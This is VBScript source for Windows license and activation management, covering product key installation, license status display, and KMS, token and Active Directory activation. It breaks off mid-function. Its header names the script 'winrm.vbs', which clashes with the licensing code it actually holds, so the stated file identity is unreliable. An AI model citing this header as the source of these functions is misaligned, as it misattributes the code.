'
' Copyright (c) Microsoft Corporation.  All rights reserved.
'
' VBScript Source File
'
' Script Name: winrm.vbs
'

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Get the resource string with the given name from the locale specific
' dictionary.  If not found, use the built in default.
Private function GetResource(name)
        LoadResourceData
        If resourceDictionary.Exists(name) Then
                GetResource = resourceDictionary.Item(name)
        Else
                GetResource = Eval(name)
        End If
End Function



'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Reads resource strings from an ini file
Function ReadResources(stream)
    Const ERROR_FILE_NOT_FOUND = 2
    Dim ln, arr, key, value

    If Not IsObject(stream) Then Err.Raise ERROR_FILE_NOT_FOUND

    Do Until stream.AtEndOfStream
        ln = stream.ReadLine

        arr = Split(ln, "=", 2, 1)
        If UBound(arr, 1) = 1 Then
            ' Trim the key and the value first before trimming quotes
            key = Trim(arr(0))
            value = TrimChar(Trim(arr(1)), """")

            'WScript.stderr.writeline "Read key " & key & " = " & value
                        If key <> "" Then
                                resourceDictionary.Add key, value
                        End If
        End If
    Loop
End Function

Private Sub DisplayAllInformation(strParm, bVerbose)
    Dim objService, objProduct
    Dim strServiceSelectClause
    Dim objProductIter, strIterSelectClause, strProductSelectClause
    Dim strDescription, bKmsClient, strSLActID, bKmsServer, bTBL
    Dim strAVMAId, bAVMA
    Dim ls, gpMin, gpDay, displayDate
    Dim strOutput
    Dim strUrl
    Dim bShowSkuInformation
    Dim iIsPrimaryWindowsSku, bUseDefault
    Dim productKeyFound

    Dim strErr
    strParm = LCase(strParm)
    productKeyFound = False

    strServiceSelectClause = _
        "KeyManagementServiceListeningPort, KeyManagementServiceDnsPublishing, " & _
        "KeyManagementServiceLowPriority, ClientMachineId, KeyManagementServiceHostCaching, " & _
        "Version"

    strProductSelectClause = _
        ProductIsPrimarySkuSelectClause & ", " & _
        "ProductKeyID, ProductKeyChannel, OfflineInstallationId, " & _
        "ProcessorURL, MachineURL, UseLicenseURL, ProductKeyURL, ValidationURL, " & _
        "GracePeriodRemaining, LicenseStatus, LicenseStatusReason, EvaluationEndDate, " & _
        "VLRenewalInterval, VLActivationInterval, KeyManagementServiceLookupDomain, KeyManagementServiceMachine, " & _
        "KeyManagementServicePort, DiscoveredKeyManagementServiceMachineName, " & _
        "DiscoveredKeyManagementServiceMachinePort, DiscoveredKeyManagementServiceMachineIpAddress, KeyManagementServiceProductKeyID," & _
        "TokenActivationILID, TokenActivationILVID, TokenActivationGrantNumber," & _
        "TokenActivationCertificateThumbprint, TokenActivationAdditionalInfo, TrustedTime," & _
        "ADActivationObjectName, ADActivationObjectDN, ADActivationCsvlkPid, ADActivationCsvlkSkuId, VLActivationTypeEnabled, VLActivationType," & _
        "IAID, AutomaticVMActivationHostMachineName, AutomaticVMActivationLastActivationTime, AutomaticVMActivationHostDigitalPid2"
    
    If bVerbose Then
        strServiceSelectClause = "RemainingWindowsReArmCount, " & strServiceSelectClause
        strProductSelectClause = "RemainingAppReArmCount, RemainingSkuReArmCount, " & strProductSelectClause
    End If

    set objService = GetServiceObject(strServiceSelectClause)

    If bVerbose Then
        LineOut GetResource("L_MsgServiceVersion") & objService.Version
    End If

    If (strParm = "all") Then
        strIterSelectClause = strProductSelectClause
    Else
        strIterSelectClause = ProductIsPrimarySkuSelectClause
    End If

    For Each objProductIter in GetProductCollection(strIterSelectClause, EmptyWhereClause)

        strSLActID = objProductIter.ID

        ' Display information if:
        '    parm = "all" or
        '    ActID = parm or
        '    default to current ActID (parm = "" and IsPrimaryWindowsSKU is 1 or 2)
        iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProductIter)
        bUseDefault = False
        bShowSkuInformation = False

        If (strParm = "" And ((iIsPrimaryWindowsSku = 1) Or (iIsPrimaryWindowsSku = 2))) Then
            bUseDefault = True
            bShowSkuInformation = True
        End If

        If (strParm = "" And (objProductIter.LicenseIsAddon And objProductIter.PartialProductKey <> "")) Then
            bShowSkuInformation = True
        End If

        If (strParm = "all") Then
            bShowSkuInformation = True
        End If

        If (strParm = LCase(strSLActID)) Then
            bShowSkuInformation = True
        End If

        If (bShowSkuInformation) Then
        
            If (strParm = "all") Then
                set objProduct = objProductIter
            Else
                set objProduct = GetProductObject(strProductSelectClause, "id = '" & objProductIter.ID & "'")
            End If

            strDescription = objProduct.Description

            'If the user didn't specify anything and we are showing the default case, warn them
            ' if this can't be verified as the primary SKU
            If ((bUseDefault = True) And (iIsPrimaryWindowsSku = 2)) Then
                OutputIndeterminateOperationWarning(objProduct)
            End IF

            productKeyFound = True

            LineOut ""
            LineOut GetResource("L_MsgProductName") & objProduct.Name

            LineOut GetResource("L_MsgProductDesc") & strDescription

            If objProduct.TokenActivationAdditionalInfo <> "" Then
                LineOut Replace( _
                    GetResource("L_MsgTkaInfoAdditionalInfo"), _
                    "%MOREINFO%", _
                    objProduct.TokenActivationAdditionalInfo _
                    )
            End If

            bKmsServer = IsKmsServer(strDescription)
            bKmsClient = IsKmsClient(strDescription)
            bTBL       = IsTBL(strDescription)
            bAVMA      = IsAVMA(strDescription)

            If bVerbose Then
                LineOut GetResource("L_MsgActID") & strSLActID
                LineOut GetResource("L_MsgAppID") & objProduct.ApplicationID
                LineOut GetResource("L_MsgPID4") & objProduct.ProductKeyID
                LineOut GetResource("L_MsgChannel") & objProduct.ProductKeyChannel
                LineOut GetResource("L_MsgInstallationID") & objProduct.OfflineInstallationId

                If (NOT bKmsClient) AND (NOT bAVMA) Then

                    'Note that we are re-using the UseLicenseURL for the Product Activation
                    'URL for down-level compatibility reasons

                    strUrl = objProduct.ProcessorURL
                    If strUrl <> "" Then
                        LineOut GetResource("L_MsgProcessorCertUrl") & strUrl
                    End If

                    strUrl = objProduct.MachineURL
                    If strUrl <> "" Then
                        LineOut GetResource("L_MsgMachineCertUrl") & strUrl
                    End If

                    strUrl = objProduct.UseLicenseURL
                    If strUrl <> "" Then
                        LineOut GetResource("L_MsgUseLicenseCertUrl") & strUrl
                    End If

                    strUrl = objProduct.ProductKeyURL
                    If strUrl <> "" Then
                        LineOut GetResource("L_MsgPKeyCertUrl") & strUrl
                    End If

                    strUrl = objProduct.ValidationURL
                    If strUrl <> "" Then
                        LineOut GetResource("L_MsgValidationUrl") & strUrl
                    End If

                End If
            End If

            If objProduct.PartialProductKey <> "" Then
                LineOut GetResource("L_MsgPartialPKey") & objProduct.PartialProductKey
            Else
                LineOut GetResource("L_MsgErrorLicenseNotInUse")
            End If

            ls = objProduct.LicenseStatus

            If ls = 0 Then
                LineOut GetResource("L_MsgLicenseStatusUnlicensed_1")

            ElseIf ls = 1 Then
                LineOut GetResource("L_MsgLicenseStatusLicensed_1")
                gpMin = objProduct.GracePeriodRemaining
                If (gpMin <> 0) Then
                    gpDay = GetDaysFromMins(gpMin)
                    If (bTBL) Then
                        strOutput = Replace(GetResource("L_MsgLicenseStatusTBL_1"), "%MINUTE%", gpMin)
                    ElseIf (bAVMA) Then
                        strOutput = Replace(GetResource("L_MsgLicenseStatusAVMA_1"), "%MINUTE%", gpMin)
                    Else
                        strOutput = Replace(GetResource("L_MsgLicenseStatusVL_1"), "%MINUTE%", gpMin)
                    End If
                    strOutput = Replace(strOutput, "%DAY%", gpDay)
                    LineOut strOutput
                End If

            ElseIf ls = 2 Then
                LineOut GetResource("L_MsgLicenseStatusInitialGrace_1")
                gpMin = objProduct.GracePeriodRemaining
                gpDay = GetDaysFromMins(gpMin)
                strOutput = Replace(GetResource("L_MsgLicenseStatusTimeRemaining"), "%MINUTE%", gpMin)
                strOutput = Replace(strOutput, "%DAY%", gpDay)
                LineOut strOutput

            ElseIf ls = 3 Then
                LineOut GetResource("L_MsgLicenseStatusAdditionalGrace_1")
                gpMin = objProduct.GracePeriodRemaining
                gpDay = GetDaysFromMins(gpMin)
                strOutput = Replace(GetResource("L_MsgLicenseStatusTimeRemaining"), "%MINUTE%", gpMin)
                strOutput = Replace(strOutput, "%DAY%", gpDay)
                LineOut strOutput

            ElseIf ls = 4 Then
                LineOut GetResource("L_MsgLicenseStatusNonGenuineGrace_1")
                gpMin = objProduct.GracePeriodRemaining
                gpDay = GetDaysFromMins(gpMin)
                strOutput = Replace(GetResource("L_MsgLicenseStatusTimeRemaining"), "%MINUTE%", gpMin)
                strOutput = Replace(strOutput, "%DAY%", gpDay)
                LineOut strOutput

            ElseIf ls = 5 Then
                LineOut GetResource("L_MsgLicenseStatusNotification_1")
                strErr = CStr(Hex(objProduct.LicenseStatusReason))
                if (objProduct.LicenseStatusReason = HR_SL_E_NOT_GENUINE) Then
                   strOutput = Replace(GetResource("L_MsgNotificationErrorReasonNonGenuine"), "%ERRCODE%", strErr)
                ElseIf (objProduct.LicenseStatusReason = HR_SL_E_GRACE_TIME_EXPIRED) Then
                    strOutput = Replace(GetResource("L_MsgNotificationErrorReasonExpiration"), "%ERRCODE%", strErr)
                Else
                    strOutput = Replace(GetResource("L_MsgNotificationErrorReasonOther"), "%ERRCODE%", strErr)
                End If
                LineOut strOutput

            ElseIf ls = 6 Then
                LineOut GetResource("L_MsgLicenseStatusExtendedGrace_1")
                gpMin = objProduct.GracePeriodRemaining
                gpDay = GetDaysFromMins(gpMin)
                strOutput = Replace(GetResource("L_MsgLicenseStatusTimeRemaining"), "%MINUTE%", gpMin)
                strOutput = Replace(strOutput, "%DAY%", gpDay)
                LineOut strOutput

            Else
                LineOut GetResource("L_MsgLicenseStatusUnknown")
            End If

            If (ls <> 0 And bVerbose) Then
                Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
                displayDate.Value = objProduct.EvaluationEndDate
                If (displayDate.GetFileTime(false) <> 0) Then
                    LineOut GetResource("L_MsgLicenseStatusEvalEndData") & displayDate.GetVarDate
                End If
            End If

            If (bVerbose) Then
                If (LCase(objProduct.ApplicationId) = WindowsAppId) Then
                    LineOut Replace(GetResource("L_MsgRemainingWindowsRearmCount"), "%COUNT%", objService.RemainingWindowsReArmCount)
                Else
                    LineOut Replace(GetResource("L_MsgRemainingAppRearmCount"), "%COUNT%", objProduct.RemainingAppReArmCount)
                End If
                LineOut Replace(GetResource("L_MsgRemainingSkuRearmCount"), "%COUNT%", objProduct.RemainingSkuReArmCount)

                Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
                displayDate.Value = objProduct.TrustedTime
                If (displayDate.GetFileTime(false) <> 0) Then
                    LineOut GetResource("L_MsgCurrentTrustedTime") & displayDate.GetVarDate
                End If

            End If

            '
            ' KMS client properties
            '

            If bKmsClient Then

                If (objProduct.VLActivationTypeEnabled = 1) Then
                    LineOut GetResource("L_MsgVLActivationTypeAD")
                ElseIf (objProduct.VLActivationTypeEnabled = 2) Then
                    LineOut GetResource("L_MsgVLActivationTypeKMS")
                ElseIf (objProduct.VLActivationTypeEnabled = 3) Then
                    LineOut GetResource("L_MsgVLActivationTypeToken")
                Else
                    LineOut GetResource("L_MsgVLActivationTypeAll")
                End If

                If IsADActivated(objProduct) Then
                    DisplayADClientInformation objService, objProduct
                ElseIf IsTokenActivated(objProduct) Then
                    DisplayTkaClientInformation objService, objProduct
                ElseIf ls <> 1 Then
                    LineOut GetResource("L_MsgPleaseActivateRefreshKMSInfo")
                Else
                    DisplayKMSClientInformation objService, objProduct
                End If
            End If

            If (bKmsServer Or (iIsPrimaryWindowsSku = 1) Or (iIsPrimaryWindowsSku = 2)) Then
                DisplayKMSInformation objService, objProduct
            End If

            If (bAVMA) Then
                strAVMAId = objProduct.IAID

                If strAVMAId <> "" And Not IsNull(strAVMAId) Then
                    LineOut GetResource("L_MsgAVMAID") & strAVMAId
                Else
                    LineOut GetResource("L_MsgAVMAID") & GetResource("L_MsgNotAvailable")
                End If

                DisplayAVMAClientInformation objProduct
            End If
      
            'We should stop processing if we aren't processing All and either we were told to process a single
            'entry only or we found the primary SKU
            If strParm <> "all" Then
                If (strParm = LCase(strSLActID)) Then
                    Exit For  'no need to continue
                End If
            End If

            LineOut ""
        End If
    Next

    If productKeyFound = False Then
        LineOut GetResource("L_MsgErrorPKey")
    End If

End Sub



Private Sub InstallProductKey(strProductKey)
    Dim objService, objProduct
    Dim lRet, strDescription, strOutput, strVersion
    Dim iIsPrimaryWindowsSku, bIsKMS

    bIsKMS = False

    On Error Resume Next

    set objService = GetServiceObject("Version")
    strVersion = objService.Version
    objService.InstallProductKey(strProductKey)
    QuitIfError()

    ' Installing a product key could change Windows licensing state.
    ' Since the service determines if it can shut down and when is the next start time
    ' based on the licensing state we should reconsume the licenses here.
    objService.RefreshLicenseStatus()

    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause, PartialProductKeyNonNullWhereClause)
        strDescription = objProduct.Description

        iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
        If (iIsPrimaryWindowsSku = 2) Then
            OutputIndeterminateOperationWarning(objProduct)
        End If

        If IsKmsServer(strDescription) Then
            bIsKMS = True
            Exit For
        End If
    Next

    If (bIsKMS = True) Then
        ' Set the KMS version in the registry (64 and 32 bit versions)
        lRet = SetRegistryStr(HKEY_LOCAL_MACHINE, SLKeyPath, "KeyManagementServiceVersion", strVersion)
        If (lRet <> 0) Then
            QuitWithError lRet
        End If

        If ExistsRegistryKey(HKEY_LOCAL_MACHINE, SLKeyPath32) Then
            lRet = SetRegistryStr(HKEY_LOCAL_MACHINE, SLKeyPath32, "KeyManagementServiceVersion", strVersion)
            If (lRet <> 0) Then
                QuitWithError lRet
            End If
        End If
    Else
        ' Clear the KMS version in the registry (64 and 32 bit versions)
        lRet = DeleteRegistryValue(HKEY_LOCAL_MACHINE, SLKeyPath, "KeyManagementServiceVersion")
        If (lRet <> 0 And lRet <> 2 And lRet <> 5) Then
            QuitWithError lRet
        End If

        lRet = DeleteRegistryValue(HKEY_LOCAL_MACHINE, SLKeyPath32, "KeyManagementServiceVersion")
        If (lRet <> 0 And lRet <> 2 And lRet <> 5) Then
            QuitWithError lRet
        End If
    End If

    strOutput = Replace(GetResource("L_MsgInstalledPKey"), "%PKEY%", strProductKey)
    LineOut strOutput
End Sub



Private Sub ExpirationDatime(strActivationID)
    Dim strWhereClause
    Dim objProduct
    Dim strSLActID, ls, graceRemaining, strEnds
    Dim strOutput
    Dim strDescription, bTBL, bAVMA
    Dim iIsPrimaryWindowsSku
    Dim bFound

    strActivationID = LCase(strActivationID)

    bFound = False

    If strActivationId = "" Then
        strWhereClause = "ApplicationId = '" & WindowsAppId & "'"
    Else
        strWhereClause = "ID = '" & Replace(strActivationID, "'", "")  & "'"
    End If

    strWhereClause = strWhereClause & " AND " & PartialProductKeyNonNullWhereClause

    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause & ", LicenseStatus, GracePeriodRemaining", strWhereClause)
        
        strSLActID = objProduct.ID
        ls = objProduct.LicenseStatus
        graceRemaining = objProduct.GracePeriodRemaining
        strEnds = DateAdd("n", graceRemaining, Now)

        bFound = True

        iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
        If (strActivationID = "") And (iIsPrimaryWindowsSku = 2) Then
            OutputIndeterminateOperationWarning(objProduct)
        End If

        strOutput = ""

        If ls = 0 Then
            strOutput = GetResource("L_MsgLicenseStatusUnlicensed")

        ElseIf ls = 1 Then
            If graceRemaining <> 0 Then

                strDescription = objProduct.Description

                bTBL = IsTBL(strDescription)

                bAVMA = IsAVMA(strDescription)

                If bTBL Then
                    strOutput = Replace(GetResource("L_MsgLicenseStatusTBL"), "%ENDDATE%", strEnds)
                ElseIf bAVMA Then
                    strOutput = Replace(GetResource("L_MsgLicenseStatusAVMA"), "%ENDDATE%", strEnds)
                Else
                    strOutput = Replace(GetResource("L_MsgLicenseStatusVL"), "%ENDDATE%", strEnds)
                End If
            Else
                strOutput = GetResource("L_MsgLicenseStatusLicensed")
            End If

        ElseIf ls = 2 Then
            strOutput = Replace(GetResource("L_MsgLicenseStatusInitialGrace"), "%ENDDATE%", strEnds)
        ElseIf ls = 3 Then
            strOutput = Replace(GetResource("L_MsgLicenseStatusAdditionalGrace"), "%ENDDATE%", strEnds)
        ElseIf ls = 4 Then
            strOutput = Replace(GetResource("L_MsgLicenseStatusNonGenuineGrace"), "%ENDDATE%", strEnds)
        ElseIf ls = 5 Then
            strOutput =  GetResource("L_MsgLicenseStatusNotification")
        ElseIf ls = 6 Then
            strOutput = Replace(GetResource("L_MsgLicenseStatusExtendedGrace"), "%ENDDATE%", strEnds)
        End If

        If strOutput <> "" Then
            LineOut objProduct.Name & ":"
            Lineout "    " & strOutput
        End If
    Next

    If True <> bFound Then
        LineOut GetResource("L_MsgErrorPKey")
    End If
End Sub



Private Function GetKmsClientObjectByActivationID(strActivationID)
    Dim objProduct, objTarget

    strActivationID = LCase(strActivationID)

    Set objTarget = Nothing

    On Error Resume Next

    If strActivationID = "" Then
        Set objTarget = GetServiceObject("Version, " & KMSClientLookupClause)
        QuitIfError()
    Else
        For Each objProduct in GetProductCollection("ID, " & KMSClientLookupClause, EmptyWhereClause)
            If (LCase(objProduct.ID) = strActivationID) Then
                Set objTarget = objProduct
                Exit For
            End If
        Next

        If objTarget is Nothing Then
            Lineout Replace(GetResource("L_MsgErrorActivationID"), "%ActID%", strActivationID)
        End If
    End If

    Set GetKmsClientObjectByActivationID = objTarget
End Function



Private Sub SetKmsMachineName(strKmsNamePort, strActivationID)
    Dim objTarget
    Dim nColon, strKmsName, strKmsNamePrev, strKmsPort, nBracketEnd
    Dim nKmsPort

    nBracketEnd = InStr(StrKmsNamePort, "]")
    If InStr(strKmsNamePort, "[") = 1 And nBracketEnd > 1 Then
    ' IPV6 Address
        If  Len(StrKmsNamePort) = nBracketEnd Then
            'No Port Number
            strKmsName = strKmsNamePort
            strKmsPort = ""
        Else
            strKmsName = Left(strKmsNamePort, nBracketEnd)
            strKmsPort = Right(strKmsNamePort, Len(strKmsNamePort) - nBracketEnd - 1)
        End If
    Else
    ' IPV4 Address
        nColon = InStr(1, strKmsNamePort, ":")
        If nColon <> 0 Then
            strKmsName = Left(strKmsNamePort, nColon - 1)
            strKmsPort = Right(strKmsNamePort, Len(strKmsNamePort) - nColon)
        Else
            strKmsName = strKmsNamePort
            strKmsPort = ""
        End If
    End If

    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)

    On Error Resume Next

    If Not objTarget is Nothing Then
        strKmsNamePrev = objTarget.KeyManagementServiceMachine

        If strKmsName <> "" Then
            objTarget.SetKeyManagementServiceMachine(strKmsName)
            QuitIfError()
        End If

        If strKmsPort <> "" Then
            nKmsPort = CLng(strKmsPort)
            QuitIfErrorRestoreKmsName objTarget, strKmsNamePrev
            objTarget.SetKeyManagementServicePort(nKmsPort)
            QuitIfErrorRestoreKmsName objTarget, strKmsNamePrev
        Else
            objTarget.ClearKeyManagementServicePort()
            QuitIfErrorRestoreKmsName objTarget, strKmsNamePrev
        End If

        LineOut Replace(GetResource("L_MsgKmsNameSet"), "%KMS%", strKmsNamePort)

        If objTarget.KeyManagementServiceLookupDomain <> "" Then
            LineOut Replace(GetResource("L_MsgKmsUseMachineNameOverrides"), _
                            "%KMS%", _
                            strKmsNamePort)
        End If
    End If
End Sub



Private Sub SetKmsLookupDomain(strKmsLookupDomain, strActivationID)
    Dim objTarget
    Dim strKms, nPort

    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)

    On Error Resume Next

    If Not objTarget is Nothing Then
        objTarget.SetKeyManagementServiceLookupDomain(strKmsLookupDomain)
        QuitIfError()
        
        LineOut Replace(GetResource("L_MsgKmsLookupDomainSet"), "%FQDN%", strKmsLookupDomain)

        If objTarget.KeyManagementServiceMachine <> "" Then
            strKms = objTarget.KeyManagementServiceMachine
            nPort  = objTarget.KeyManagementServicePort
            LineOut Replace(GetResource("L_MsgKmsUseMachineNameOverrides"), _
                            "%KMS%", strKms & ":" & nPort)
        End If
    End If
End Sub



Private Sub ClearKmsLookupDomain(strActivationID)
    Dim objTarget
    Dim strKms, nPort
    
    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)

    On Error Resume Next

    If Not objTarget is Nothing Then
        objTarget.ClearKeyManagementServiceLookupDomain
        QuitIfError()

        LineOut GetResource("L_MsgKmsLookupDomainCleared")

        If objTarget.KeyManagementServiceMachine <> "" Then
            strKms = objTarget.KeyManagementServiceMachine
            nPort  = objTarget.KeyManagementServicePort
            LineOut Replace(GetResource("L_MsgKmsUseMachineName"), _
                            "%KMS%", strKms & ":" & nPort)
        End If
        
    End If
End Sub



Private Sub SetHostCachingDisable(boolHostCaching)
    Dim objService

    On Error Resume Next

    set objService = GetServiceObject("Version")
    QuitIfError()

    objService.DisableKeyManagementServiceHostCaching(boolHostCaching)
    QuitIfError()

    If boolHostCaching Then
        LineOut GetResource("L_MsgKmsHostCachingDisabled")
    Else
        LineOut GetResource("L_MsgKmsHostCachingEnabled")
    End If

End Sub



Private Sub SetActivationInterval(intInterval)
    Dim objService, objProduct
    Dim kmsFlag, strOutput

    If (intInterval < 0) Then
        LineOut GetResource("L_MsgInvalidDataError")
        Exit Sub
    End If

    On Error Resume Next

    set objService = GetServiceObject("Version")
    QuitIfError()

    For Each objProduct in GetProductCollection("ID, IsKeyManagementServiceMachine", PartialProductKeyNonNullWhereClause)
        kmsFlag = objProduct.IsKeyManagementServiceMachine
        If kmsFlag = 1 Then
            objService.SetVLActivationInterval(intInterval)
            QuitIfError()
            strOutput = Replace(GetResource("L_MsgActivationSet"), "%ACTIVATION%", intInterval)
            LineOut strOutput
            LineOut GetResource("L_MsgWarningKmsReboot")

            Exit For
        End If
    Next

    If kmsFlag <> 1 Then
        LineOut GetResource("L_MsgWarningActivation")
    End If
End Sub



Private Sub SetRenewalInterval(intInterval)
    Dim objService, objProduct
    Dim kmsFlag, strOutput

    If (intInterval < 0) Then
        LineOut GetResource("L_MsgInvalidDataError")
        Exit Sub
    End If

    On Error Resume Next

    set objService = GetServiceObject("Version")
    QuitIfError()

    For Each objProduct in GetProductCollection("ID, IsKeyManagementServiceMachine", PartialProductKeyNonNullWhereClause)
        kmsFlag = objProduct.IsKeyManagementServiceMachine
        If kmsFlag Then
            objService.SetVLRenewalInterval(intInterval)
            QuitIfError()
            strOutput = Replace(GetResource("L_MsgRenewalSet"), "%RENEWAL%", intInterval)
            LineOut strOutput
            LineOut GetResource("L_MsgWarningKmsReboot")

            Exit For
        End If
    Next

    If kmsFlag <> 1 Then
        LineOut GetResource("L_MsgWarningRenewal")
    End If
End Sub



Private Sub SetVLActivationType(intType, strActivationID)
    Dim objTarget
    
    If IsNull(intType) Then
        intType = 0
    End If

    If (intType < 0) Or (intType > 3) Then
        LineOut GetResource("L_MsgInvalidDataError")
        Exit Sub
    End If

    Set objTarget = GetKmsClientObjectByActivationID(strActivationID)

    On Error Resume Next

    If Not objTarget is Nothing Then
        If (intType <> 0) Then
            objTarget.SetVLActivationTypeEnabled(intType)
            QuitIfError()
        Else
            objTarget.ClearVLActivationTypeEnabled()
            QuitIfError()
        End If
        
        LineOut GetResource("L_MsgVLActivationTypeSet")
    End If
End Sub

''
'' Token-based Activation Commands
''

Private Function IsTokenActivated(objProduct)

    Dim nILVID

    On Error Resume Next

    nILVID = objProduct.TokenActivationILVID

    IsTokenActivated = ((Err.Number = 0) And (nILVID <> &HFFFFFFFF))

End Function



Private Sub TkaListILs
    Dim objLicense
    Dim strHeader
    Dim strError
    Dim strGuids
    Dim arrGuids
    Dim nListed

    Dim objWmiDate

    LineOut GetResource("L_MsgTkaLicenses")
    LineOut ""

    Set objWmiDate = CreateObject("WBemScripting.SWbemDateTime")

    nListed = 0
    For Each objLicense in g_objWMIService.InstancesOf(TkaLicenseClass)

        strHeader = GetResource("L_MsgTkaLicenseHeader")
        strHeader = Replace(strHeader, "%ILID%" , objLicense.ILID )
        strHeader = Replace(strHeader, "%ILVID%", objLicense.ILVID)
        LineOut strHeader

        LineOut "    " & Replace(GetResource("L_MsgTkaLicenseILID"), "%ILID%", objLicense.ILID)
        LineOut "    " & Replace(GetResource("L_MsgTkaLicenseILVID"), "%ILVID%", objLicense.ILVID)

        If Not IsNull(objLicense.ExpirationDate) Then

            objWmiDate.Value = objLicense.ExpirationDate

            If (objWmiDate.GetFileTime(false) <> 0) Then
                LineOut "    " & Replace(GetResource("L_MsgTkaLicenseExpiration"), "%TODATE%", objWmiDate.GetVarDate)
            End If

        End If

        If Not IsNull(objLicense.AdditionalInfo) Then
            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseAdditionalInfo"), "%MOREINFO%", objLicense.AdditionalInfo)
        End If

        If Not IsNull(objLicense.AuthorizationStatus) And _
           objLicense.AuthorizationStatus <> 0 _
        Then
            strError = CStr(Hex(objLicense.AuthorizationStatus))
            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseAuthZStatus"), "%ERRCODE%", strError)
        Else
            LineOut "    " & Replace(GetResource("L_MsgTkaLicenseDescr"), "%DESC%", objLicense.Description)
        End If

        LineOut ""
        nListed = nListed + 1
    Next

    if 0 = nListed Then
        LineOut GetResource("L_MsgTkaLicenseNone")
    End If
End Sub



Private Sub TkaRemoveIL(strILID, strILVID)
    Dim objLicense
    Dim strMsg
    Dim nRemoved

    Dim nILVID

    On Error Resume Next
    nILVID = CInt(strILVID)
    QuitIfError()

    LineOut GetResource("L_MsgTkaRemoving")
    LineOut ""

    nRemoved = 0
    For Each objLicense in g_objWMIService.InstancesOf(TkaLicenseClass)
        If strILID = objLicense.ILID And nILVID = objLicense.ILVID Then
            strMsg = GetResource("L_MsgTkaRemovedItem")
            strMsg = Replace(strMsg, "%SLID%", objLicense.ID)

            On Error Resume Next
            objLicense.Uninstall
            QuitIfError()
            LineOut strMsg
            nRemoved = nRemoved + 1
        End If
    Next

    If nRemoved = 0 Then
        LineOut GetResource("L_MsgTkaRemovedNone")
    End If
End Sub



Private Sub TkaListCerts
    Dim objProduct
    Dim objSigner
    Dim iRet
    Dim arrGrants()
    Dim arrThumbprints
    Dim strThumbprint

    On Error Resume Next

    Set objSigner  = TkaGetSigner()
    Set objProduct = TkaGetProduct()

    iRet = objProduct.GetTokenActivationGrants(arrGrants)
    QuitIfError()

    arrThumbprints = objSigner.GetCertificateThumbprints(arrGrants)
    QuitIfError()

    For Each strThumbprint in arrThumbprints
        TkaPrintCertificate strThumbprint
    Next
End Sub



Private Sub TkaActivate(strThumbprint, strPin)
    Dim objService
    Dim objProduct
    Dim objSigner
    Dim iRet

    Dim strChallenge

    Dim strAuthInfo1
    Dim strAuthInfo2

    Set objSigner  = TkaGetSigner()
    Set objProduct = TkaGetProduct()
    Set objService = TkaGetService()

    DisplayActivatingSku objProduct

    On Error Resume Next

    iRet = objProduct.GenerateTokenActivationChallenge(strChallenge)
    QuitIfError()

    strAuthInfo1 = objSigner.Sign(strChallenge, strThumbprint, strPin, strAuthInfo2)
    QuitIfError()

    iRet = objProduct.DepositTokenActivationResponse(strChallenge, strAuthInfo1, strAuthInfo2)
    QuitIfError()

    objService.RefreshLicenseStatus()
    Err.Number = 0

    objProduct.refresh_
    DisplayActivatedStatus objProduct
    QuitIfError()

End Sub



Private Function TkaGetService()

    Set TkaGetService = GetServiceObject("Version")

End Function



Private Function TkaGetProduct()

    Dim objWinProductsWithPKeyInstalled
    Dim objProduct

    On Error Resume Next

    Set TkaGetProduct = Nothing

    Set TkaGetProduct = GetProductObject( _
                       "ID, Name, ApplicationId, PartialProductKey, Description, LicenseIsAddon ", _
                       "ApplicationId = '" & WindowsAppId & "' " &_
                       "AND PartialProductKey <> NULL " & _
                       "AND LicenseIsAddon = FALSE" _
                       )
    QuitIfError()

End Function



Private Function TkaGetSigner()

    On Error Resume Next
    Set TkaGetSigner = WScript.CreateObject("SPPWMI.SppWmiTokenActivationSigner")
    QuitIfError()

End Function



Private Sub TkaPrintCertificate(strThumbprint)
    Dim arrParams

    arrParams = Split(strThumbprint, "|")

    LineOut ""
    LineOut Replace(GetResource("L_MsgTkaCertThumbprint"), "%THUMBPRINT%", arrParams(0))
    LineOut Replace(GetResource("L_MsgTkaCertSubject"   ), "%SUBJECT%"   , arrParams(1))
    LineOut Replace(GetResource("L_MsgTkaCertIssuer"    ), "%ISSUER%"    , arrParams(2))
    LineOut Replace(GetResource("L_MsgTkaCertValidFrom" ), "%FROMDATE%"  , FormatDateTime(CDate(arrParams(3)), vbShortDate))
    LineOut Replace(GetResource("L_MsgTkaCertValidTo"   ), "%TODATE%"    , FormatDateTime(CDate(arrParams(4)), vbShortDate))
End Sub

''
'' Active Directory Activation Commands
''

Private Function IsADActivated(objProduct)
    On Error Resume Next

    If (objProduct.VLActivationType = 1) Then
        IsADActivated = True
    Else
        IsADActivated = False
    End If

End Function



Private Sub ADActivateOnline(strProductKey, strActivationObjectName)
    Dim objService

    FailRemoteExec()

    On Error Resume Next

    set objService = GetServiceObject("Version")
    QuitIfError()

    objService.DoActiveDirectoryOnlineActivation strProductKey, strActivationObjectName
    QuitIfError()

    LineOut GetResource("L_MsgActivated")

End Sub



Private Sub ADGetIID(strProductKey)
    Dim objService
    Dim strIID

    FailRemoteExec()

    On Error Resume Next

    set objService = GetServiceObject("Version")

    objService.GenerateActiveDirectoryOfflineActivationId strProductKey, strIID
    QuitIfError()

    LineOut GetResource("L_MsgInstallationID") & strIID
    LineOut ""
    LineOut GetResource("L_MsgPhoneNumbers")

End Sub



Private Sub ADActivatePhone(strProductKey, strCID, strActivationObjectName)
    Dim objService
    Dim strIID

    FailRemoteExec()

    On Error Resume Next

    set objService = GetServiceObject("Version")

    objService.DepositActiveDirectoryOfflineActivationConfirmation strProductKey, strCID, strActivationObjectName
    QuitIfError()

    LineOut GetResource("L_MsgActivated")

End Sub



Private Sub ADListActivationObjects()
    Dim machineDomain
    Dim namespace
    Dim rootDSE, configurationNC
    Dim container, child
    Dim found

